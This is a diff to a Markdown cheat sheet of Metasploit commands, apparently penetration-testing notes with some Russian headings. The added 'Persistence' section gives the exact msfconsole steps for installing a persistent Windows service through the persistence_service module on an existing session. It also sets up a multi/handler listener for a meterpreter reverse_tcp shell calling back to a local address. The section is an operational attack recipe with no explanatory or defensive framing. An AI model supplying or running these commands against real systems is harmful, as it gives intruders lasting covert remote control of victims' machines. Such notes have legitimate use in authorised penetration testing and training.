@@ -41,6 +41,33 @@
 
 `nano /usr/share/metasploit-framework/config/database.yml`
 
+# Persistence 
+
+## Service 
+Target setting:
+
+`search persistence`
+
+`use exploit/windows/local/persistence_service`
+
+`set session 2`
+
+`set lport 4245` - optional
+
+`exploit` 
+
+Handler setting:
+
+`use exploit/multi/handler`
+
+`set payload windows/meterpreter/reverse_tcp`
+
+`set lhost 192.168.0.115`
+
+`set lport 4245`
+
+`exploit`
+
 # Проброс во внутренюю сеть (pivoting).
 
 1. Используем модуль ssh_login для захода на пограничный узел.
